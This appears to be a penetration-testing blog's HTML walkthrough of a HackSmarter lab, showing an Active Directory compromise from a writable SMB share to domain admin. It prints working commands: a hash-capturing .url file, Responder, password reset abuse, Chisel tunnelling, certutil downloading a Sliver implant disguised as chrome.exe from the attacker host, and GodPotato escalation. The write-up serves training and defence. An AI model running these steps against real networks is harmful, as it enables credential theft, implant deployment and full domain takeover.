@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ShareThePain - HackSmarter Labs Walkthrough | Zerotrace Logs</title>
+  <meta name="description" content="Complete walkthrough of ShareThePain from HackSmarter Labs. Active Directory penetration testing covering SMB enumeration, LLMNR poisoning, BloodHound analysis, and privilege escalation via SeImpersonatePrivilege." />
+
+  <!-- Essential Open Graph tags for LinkedIn -->
+  <meta property="og:title" content="ShareThePain - HackSmarter Labs Walkthrough | Zerotrace" />
+  <meta property="og:description" content="Active Directory penetration testing walkthrough covering SMB enumeration, LLMNR poisoning, BloodHound, MSSQL exploitation, and privilege escalation to Domain Admin." />
+  <meta property="og:image" content="https://z3rotrace.live/assets/sharethepain-bloodhound-genericall.png" />
+  <meta property="og:url" content="https://z3rotrace.live/walkthroughs/sharethepain.html" />
+  <meta property="og:type" content="article" />
+
+  <!-- Twitter Card tags -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="ShareThePain - HackSmarter Labs Walkthrough | Zerotrace" />
+  <meta name="twitter:description" content="Active Directory penetration testing walkthrough covering SMB enumeration, LLMNR poisoning, BloodHound, MSSQL exploitation, and privilege escalation to Domain Admin." />
+  <meta name="twitter:image" content="https://z3rotrace.live/assets/sharethepain-bloodhound-genericall.png" />
+
+  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
+  <link rel="apple-touch-icon" href="../assets/favicon.png" />
+  <link rel="stylesheet" href="../style.css?v=4"/>
+  <style>
+    /* Page-specific table styling for machine info */
+    .machine-info {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      background: rgba(0, 170, 255, 0.05);
+      border: 1px solid rgba(0, 170, 255, 0.2);
+      border-radius: 8px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .machine-info-item {
+      display: flex;
+      flex-direction: column;
+      gap: 0.25rem;
+    }
+
+    .machine-info-item .label {
+      font-size: 0.85rem;
+      color: #8ecde8;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .machine-info-item .value {
+      font-weight: 600;
+      color: #c77dff;
+    }
+
+    .machine-info-item .value.difficulty-medium {
+      color: #ffaa00;
+    }
+
+    /* Attack chain visualization */
+    .attack-chain {
+      background: #0d1117;
+      border: 1px solid #30363d;
+      border-left: 3px solid #c77dff;
+      border-radius: 6px;
+      padding: 1.25rem;
+      margin: 1.5rem 0;
+    }
+
+    .attack-chain ol {
+      margin: 0;
+      padding-left: 0;
+    }
+
+    .attack-chain li {
+      padding-left: 2.5rem;
+      margin-bottom: 0.5rem;
+    }
+
+    /* Tools list styling */
+    .tools-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 0.75rem;
+      margin: 1rem 0;
+    }
+
+    .tools-grid li {
+      background: rgba(0, 170, 255, 0.03);
+      border-radius: 4px;
+      padding: 0.5rem 0.75rem 0.5rem 1.5rem;
+    }
+  </style>
+</head>
+<body>
+<header>
+  <h1 class="terminal-title" aria-label="Zerotrace Logs">
+    <span class="prompt" aria-hidden="true">$</span>
+    <span class="typed" id="term-typing" aria-hidden="true"></span>
+    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
+    <span class="sr-only">Zerotrace Logs</span>
+  </h1>
+</header>
+
+<!-- Side hamburger control -->
+<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
+  <span class="sr-only">Toggle navigation</span>
+  <span class="hamburger-icon" aria-hidden="true"></span>
+</button>
+
+<!-- Sidebar navigation -->
+<aside class="sidebar" id="sidebar" aria-label="Main navigation">
+  <div class="sidebar-header">
+    <h3>Navigate</h3>
+    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
+  </div>
+  <div class="sidebar-content">
+    <ul class="sidebar-nav">
+      <li><a href="../index.html">Home</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
+        <ul class="submenu" hidden>
+          <li><a href="../writeups/welcome.html">Welcome - ADCS ESC1</a></li>
+          <li><a href="../writeups/staged.html">Staged - HackSmarter Labs</a></li>
+          <li><a href="../writeups/buildingmagic.html">BuildingMagic - HackSmarter Labs</a></li>
+          <li><a href="../writeups/arasaka.html">Arasaka - HackSmarter Labs</a></li>
+          <li><a href="../writeups/midgarden2-badsuccessor.html">Midgarden2 - BadSuccessor</a></li>
+          <li><a href="../writeups/banksmarter.html">BankSmarter - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ascension.html">Ascension - HackSmarter Labs</a></li>
+          <li><a href="../writeups/slayer.html">Slayer - HackSmarter Labs</a></li>
+          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
+          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
+        </ul>
+      </li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>Machine Walkthroughs</button>
+        <ul class="submenu">
+          <li><a href="sharethepain.html">ShareThePain</a></li>
+        </ul>
+      </li>
+      <li><a href="../vector3.html">Certification Journey</a></li>
+      <li class="has-submenu">
+        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
+        <ul class="submenu" hidden>
+          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+</aside>
+<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>
+
+<section>
+  <h2>ShareThePain</h2>
+
+  <div class="machine-info">
+    <div class="machine-info-item">
+      <span class="label">Platform</span>
+      <span class="value">HackSmarter Labs</span>
+    </div>
+    <div class="machine-info-item">
+      <span class="label">Difficulty</span>
+      <span class="value difficulty-medium">Medium</span>
+    </div>
+    <div class="machine-info-item">
+      <span class="label">Operating System</span>
+      <span class="value">Windows Server 2022 (DC)</span>
+    </div>
+    <div class="machine-info-item">
+      <span class="label">Key Topics</span>
+      <span class="value">SMB, LLMNR, BloodHound, MSSQL</span>
+    </div>
+  </div>
+
+  <div class="disclaimer">
+    <strong>Disclaimer:</strong> This walkthrough is provided for <strong>educational purposes only</strong>. The techniques demonstrated should only be used in authorized penetration testing engagements or controlled lab environments. Unauthorized access to computer systems is illegal.
+  </div>
+
+  <h3>Objective</h3>
+  <p>As a penetration tester on the Hack Smarter Red Team, the mission is to infiltrate and seize control of the client's entire Active Directory environment. This engagement simulates a full-scale assault to expose and exploit every vulnerability.</p>
+
+  <p><strong>Initial Access:</strong> Direct access to the internal network with no credentials.</p>
+  <p><strong>Goal:</strong> Enumerate, exploit, and achieve full domain compromise.</p>
+
+  <h2>Reconnaissance</h2>
+
+  <h3><span class="step">[Step 1]</span> Nmap Scan</h3>
+  <p>I started with a comprehensive port scan to identify all available services:</p>
+  <pre><code>$ nmap -p- -T4 -sC -sV -Pn 10.1.25.158 -o nmap</code></pre>
+
+  <p><strong>Key findings:</strong></p>
+  <ul>
+    <li><strong>DNS (53)</strong> - Simple DNS Plus</li>
+    <li><strong>Kerberos (88)</strong> - Confirms Active Directory</li>
+    <li><strong>SMB (445)</strong> - Potential for enumeration</li>
+    <li><strong>LDAP (389, 3268)</strong> - Domain: <code>hack.smarter</code></li>
+    <li><strong>WinRM (5985)</strong> - Remote management</li>
+    <li><strong>RDP (3389)</strong> - Windows Server 2022</li>
+  </ul>
+
+  <p>The scan identified this as a Domain Controller (<code>DC01.hack.smarter</code>) running Windows Server 2022.</p>
+
+  <h2>Initial Access</h2>
+
+  <h3><span class="step">[Step 2]</span> SMB Enumeration</h3>
+  <p>I checked for null session access on SMB shares:</p>
+  <pre><code>$ nxc smb hack.smarter -u ' ' -p '' --shares</code></pre>
+
+  <pre><code>SMB   10.1.25.158  445  DC01  [+] hack.smarter\ : (Guest)
+SMB   10.1.25.158  445  DC01  Share           Permissions     Remark
+SMB   10.1.25.158  445  DC01  -----           -----------     ------
+SMB   10.1.25.158  445  DC01  Share           READ,WRITE</code></pre>
+
+  <p>The <code>Share</code> folder has <strong>READ,WRITE</strong> access - this is significant for credential harvesting.</p>
+
+  <div class="question">
+    <strong>What is LLMNR/NBT-NS Poisoning?</strong>
+  </div>
+  <div class="answer">
+    When Windows systems cannot resolve hostnames via DNS, they fall back to broadcast protocols (LLMNR/NBT-NS). An attacker on the same network can respond to these requests, tricking victims into authenticating against the attacker's machine and capturing their NTLMv2 hashes.
+  </div>
+
+  <h3><span class="step">[Step 3]</span> Credential Harvesting with URL File</h3>
+  <p>I created a malicious URL shortcut that forces any user browsing the share to authenticate back to my machine:</p>
+  <pre><code>$ cat @pwn.url
+[InternetShortcut]
+URL=anything
+WorkingDirectory=anything
+IconFile=\\10.200.25.158\share\icon.ico
+IconIndex=1</code></pre>
+
+  <p>Started Responder to capture authentication attempts:</p>
+  <pre><code>$ sudo responder -I tun0 -v</code></pre>
+
+  <p>Uploaded the malicious file to the writable share:</p>
+  <pre><code>$ smbclient //10.1.25.158/Share -N -c 'put @pwn.url'</code></pre>
+
+  <p>Within minutes, I captured an NTLMv2 hash:</p>
+  <pre><code>[SMB] NTLMv2-SSP Username : HACK\bob.ross
+[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:7f7dc36e91980a6b:BA6C77...</code></pre>
+
+  <h3><span class="step">[Step 4]</span> Cracking the Hash</h3>
+  <pre><code>$ hashcat hash /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <p><strong>Credentials obtained:</strong> <code>bob.ross:137Password123!@#</code></p>
+
+  <p>Verified the credentials work:</p>
+  <pre><code>$ nxc smb hack.smarter -u bob.ross -p '137Password123!@#'
+SMB   10.1.25.158  445  DC01  [+] hack.smarter\bob.ross:137Password123!@#</code></pre>
+
+  <h2>Domain Enumeration</h2>
+
+  <h3><span class="step">[Step 5]</span> BloodHound Collection</h3>
+  <p>I collected Active Directory data for analysis:</p>
+  <pre><code>$ nxc ldap 10.1.25.158 -u bob.ross -p '137Password123!@#' --bloodhound --collection All --dns-server 10.1.25.158</code></pre>
+
+  <h3><span class="step">[Step 6]</span> Attack Path Discovery</h3>
+  <p>After importing the data into BloodHound, I discovered that <code>bob.ross</code> has <strong>GenericAll</strong> rights over <code>alice.wonderland</code>.</p>
+
+  <p><img src="../assets/sharethepain-bloodhound-genericall.png" alt="BloodHound showing bob.ross has GenericAll over alice.wonderland"></p>
+
+  <div class="question">
+    <strong>What is GenericAll?</strong>
+  </div>
+  <div class="answer">
+    GenericAll grants full control over an object, including the ability to reset passwords, modify group membership, and change attributes. It is one of the most powerful permissions in Active Directory.
+  </div>
+
+  <h2>Lateral Movement</h2>
+
+  <h3><span class="step">[Step 7]</span> Password Reset via GenericAll</h3>
+  <p>With GenericAll rights, I forced a password change on alice.wonderland:</p>
+  <pre><code>$ net rpc password "alice.wonderland" 'Zerotrace123@' -U 'hack.smarter/bob.ross%137Password123!@#' -S 10.1.25.158</code></pre>
+
+  <p>Verified the new credentials:</p>
+  <pre><code>$ nxc smb hack.smarter -u alice.wonderland -p 'Zerotrace123@'
+SMB   10.1.25.158  445  DC01  [+] hack.smarter\alice.wonderland:Zerotrace123@</code></pre>
+
+  <h3><span class="step">[Step 8]</span> Shell Access via WinRM</h3>
+  <p>BloodHound showed that <code>alice.wonderland</code> is a member of Remote Management Users:</p>
+
+  <p><img src="../assets/sharethepain-bloodhound-remotemanagement.png" alt="alice.wonderland is member of Remote Management Users"></p>
+
+  <pre><code>$ evil-winrm -u alice.wonderland -p 'Zerotrace123@' -i 10.1.25.158
+
+*Evil-WinRM* PS C:\Users\alice.wonderland\Documents></code></pre>
+
+  <h3><span class="step">[User Flag]</span></h3>
+  <pre><code>*Evil-WinRM* PS C:\Users\alice.wonderland\Desktop> type user.txt
+bWFkZV9pdF90aGlzX2Zhcgo=</code></pre>
+
+  <h2>Privilege Escalation</h2>
+
+  <h3><span class="step">[Step 9]</span> Internal Service Discovery</h3>
+  <p>While enumerating the system, I found a SQL2019 folder and checked for internal services:</p>
+  <pre><code>*Evil-WinRM* PS C:\> netstat -ano | findstr 1433
+  TCP    127.0.0.1:1433         0.0.0.0:0              LISTENING       4240</code></pre>
+
+  <p>MSSQL is running on localhost only - I need to tunnel this traffic.</p>
+
+  <h3><span class="step">[Step 10]</span> Port Forwarding with Chisel</h3>
+
+  <p><strong>Attack host - Start server:</strong></p>
+  <pre><code>$ sudo chisel server -p 8000 --reverse --socks5</code></pre>
+
+  <p><strong>Target - Upload and run client:</strong></p>
+  <pre><code>*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> upload chisel.exe
+*Evil-WinRM* PS C:\Users\alice.wonderland\Documents> ./chisel.exe client 10.200.25.158:8000 R:socks</code></pre>
+
+  <p>Configure proxychains (<code>/etc/proxychains4.conf</code>):</p>
+  <pre><code>[ProxyList]
+socks5  127.0.0.1 1080</code></pre>
+
+  <h3><span class="step">[Step 11]</span> MSSQL Access</h3>
+  <pre><code>$ proxychains mssqlclient.py -p 1433 alice.wonderland@127.0.0.1 -windows-auth</code></pre>
+
+  <p>Checked privileges - the user is sysadmin:</p>
+  <pre><code>SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
+-----------
+          1</code></pre>
+
+  <p>Command execution via xp_cmdshell works:</p>
+  <pre><code>SQL> xp_cmdshell "whoami"
+nt service\mssql$sqlexpress</code></pre>
+
+  <h3><span class="step">[Step 12]</span> Implant Deployment</h3>
+  <p>Generated a Sliver implant:</p>
+  <pre><code>sliver > generate --mtls 10.200.25.158:450 --os windows --arch amd64 --save .
+sliver > mtls -L 10.200.25.158 -l 450</code></pre>
+
+  <p>Transferred and executed via MSSQL:</p>
+  <pre><code>SQL> xp_cmdshell "certutil.exe -urlcache -f http://10.200.25.158/chrome.exe C:\Users\Public\chrome.exe"
+SQL> xp_cmdshell "C:\Users\Public\chrome.exe"</code></pre>
+
+  <h3><span class="step">[Step 13]</span> SeImpersonatePrivilege Exploitation</h3>
+  <p>The MSSQL service account has SeImpersonatePrivilege:</p>
+  <pre><code>SeImpersonatePrivilege          Impersonate a client after authentication       Enabled</code></pre>
+
+  <div class="question">
+    <strong>What is SeImpersonatePrivilege?</strong>
+  </div>
+  <div class="answer">
+    This privilege allows a process to impersonate other users. Service accounts typically have this privilege, and it can be abused using "Potato" attacks to escalate to SYSTEM.
+  </div>
+
+  <p>Uploaded GodPotato for privilege escalation:</p>
+  <pre><code>sliver (SHOCKED_KITCHEN) > upload godpotato.exe C:\Users\Public\godpotato.exe</code></pre>
+
+  <p>Verified SYSTEM impersonation works:</p>
+  <pre><code>PS C:\Users\Public> ./godpotato.exe -cmd "whoami"
+nt authority\system</code></pre>
+
+  <h3><span class="step">[Step 14]</span> Domain Admin Access</h3>
+  <p>Added alice.wonderland to the local Administrators group:</p>
+  <pre><code>PS C:\Users\Public> ./godpotato.exe -cmd "net localgroup Administrators alice.wonderland /add"
+The command completed successfully.</code></pre>
+
+  <h2>Root Flag</h2>
+  <p>After re-authenticating with the elevated account:</p>
+  <pre><code>$ evil-winrm -u alice.wonderland -p 'Zerotrace123@' -i 10.1.25.158
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+YWxsIGFib3V0IHRoYXQgcm9vdCwgYm91dCB0aGF0IHJvb3QsIEpVU1QgREEK</code></pre>
+
+  <h2>Attack Chain Summary</h2>
+  <div class="attack-chain">
+    <ol>
+      <li><strong>Initial Access:</strong> Exploited writable SMB share to plant LLMNR poisoning file</li>
+      <li><strong>Credential Capture:</strong> Captured bob.ross NTLMv2 hash via Responder</li>
+      <li><strong>Lateral Movement:</strong> Used GenericAll rights to reset alice.wonderland password</li>
+      <li><strong>Internal Pivot:</strong> Tunneled to internal MSSQL server via Chisel</li>
+      <li><strong>Code Execution:</strong> Achieved RCE through MSSQL xp_cmdshell</li>
+      <li><strong>Privilege Escalation:</strong> Exploited SeImpersonatePrivilege with GodPotato</li>
+      <li><strong>Domain Compromise:</strong> Added controlled user to Administrators group</li>
+    </ol>
+  </div>
+
+  <h2>Tools Used</h2>
+  <ul class="tools-grid">
+    <li><strong>Nmap</strong> - Port scanning and service enumeration</li>
+    <li><strong>NetExec (nxc)</strong> - SMB/LDAP enumeration and BloodHound collection</li>
+    <li><strong>Responder</strong> - LLMNR/NBT-NS poisoning</li>
+    <li><strong>Hashcat</strong> - Hash cracking</li>
+    <li><strong>Evil-WinRM</strong> - WinRM shell access</li>
+    <li><strong>Chisel</strong> - Port forwarding and SOCKS proxy</li>
+    <li><strong>Impacket mssqlclient.py</strong> - MSSQL interaction</li>
+    <li><strong>Sliver</strong> - C2 framework</li>
+    <li><strong>GodPotato</strong> - SeImpersonatePrivilege exploitation</li>
+  </ul>
+
+  <h2>Lessons Learned</h2>
+
+  <h3><span class="step defender">For Defenders</span></h3>
+  <ul>
+    <li><strong>Writable shares are dangerous</strong> - Never allow anonymous or guest write access to SMB shares</li>
+    <li><strong>Disable LLMNR/NBT-NS</strong> - These legacy protocols are a major attack vector</li>
+    <li><strong>Principle of least privilege</strong> - GenericAll permissions should be audited</li>
+    <li><strong>Internal services need protection</strong> - Even localhost-bound services can be pivoted to</li>
+    <li><strong>Service accounts are high-value targets</strong> - They often have dangerous privileges</li>
+  </ul>
+
+  <h3>Key Takeaways</h3>
+  <div class="answer">
+    <p>This machine demonstrates a realistic Active Directory attack chain, from initial access through domain compromise. The attack leveraged several common misconfigurations:</p>
+    <ul>
+      <li>Overly permissive SMB share permissions</li>
+      <li>Weak password policy allowing hash cracking</li>
+      <li>Excessive Active Directory permissions (GenericAll)</li>
+      <li>Internal MSSQL server accessible to domain users</li>
+      <li>Service account privileges enabling token impersonation</li>
+    </ul>
+    <p>Understanding these attack paths is essential for both offensive security professionals and defenders looking to harden their environments.</p>
+  </div>
+
+  <p><em>Walkthrough by Zerotrace | HackSmarter Labs</em></p>
+
+</section>
+
+<footer>
+  <div class="social-links" aria-label="Social media">
+    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M12 .5C5.65.5.5 5.65.5 12c0 5.08 3.29 9.38 7.86 10.9.58.1.8-.25.8-.56 0-.27-.01-1.14-.02-2.07-3.2.7-3.88-1.36-3.88-1.36-.53-1.34-1.3-1.7-1.3-1.7-1.06-.73.08-.72.08-.72 1.17.08 1.78 1.2 1.78 1.2 1.05 1.79 2.75 1.27 3.42.97.11-.76.41-1.27.75-1.56-2.55-.29-5.23-1.28-5.23-5.7 0-1.26.45-2.3 1.2-3.11-.12-.29-.52-1.46.11-3.04 0 0 .97-.31 3.18 1.19a11.08 11.08 0 0 1 2.9-.39c.98 0 1.97.13 2.9.39 2.2-1.5 3.17-1.19 3.17-1.19.63 1.58.23 2.75.12 3.04.75.81 1.2 1.85 1.2 3.11 0 4.43-2.69 5.41-5.25 5.69.42.36.8 1.08.8 2.18 0 1.58-.02 2.85-.02 3.24 0 .31.21.67.81.55A10.52 10.52 0 0 0 23.5 12c0-6.35-5.15-11.5-11.5-11.5Z"/>
+      </svg>
+    </a>
+    <a href="mailto:contact@z3rotrace.live" class="social email" aria-label="E-mail">
+      <svg width="20" height="20" viewBox="0 0 512 512" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M502.3 190.8L327.4 338.9C304.3 358.3 271.7 358.3 248.6 338.9L9.7 190.8C3.2 185.5 0 178.3 0 171.2V80C0 53.5 21.5 32 48 32H464C490.5 32 512 53.5 512 80V171.2C512 178.3 508.8 185.5 502.3 190.8Z"/>
+        <path fill="#00B8D9" d="M0 255.1V432C0 458.5 21.5 480 48 480H464C490.5 480 512 458.5 512 432V255.1L343.9 392.7C304.5 423 247.6 423 208.1 392.7L0 255.1Z"/>
+      </svg>
+    </a>
+    <a href="https://www.linkedin.com/in/panagiotis-lampousis-2a100b392/" class="social linkedin" target="_blank" rel="noopener" aria-label="LinkedIn profile">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <path fill="#00B8D9" d="M4.98 3.5c0 1.38-1.13 2.5-2.5 2.5A2.5 2.5 0 0 1 0 3.5C0 2.12 1.12 1 2.49 1a2.5 2.5 0 0 1 2.49 2.5ZM.5 23.5h4V7.99h-4V23.5Zm7.5 0h4v-8.32c0-2.21 2.4-3.46 3.94-2.02.5.47.56 1.13.56 1.86v8.48h4v-9.56c0-5.06-5.5-4.86-6.5-2.38V8h-4c.06 1.05 0 15.5 0 15.5Z"/>
+      </svg>
+    </a>
+  </div>
+  <p>&copy; 2025 Zerotrace | Built by Zerotrace | <a href="../terms-of-use.html" style="color: #00B8D9; text-decoration: underline;">Terms of Use</a></p>
+</footer>
+<script src="../script.js"></script>
+</body>
+</html>
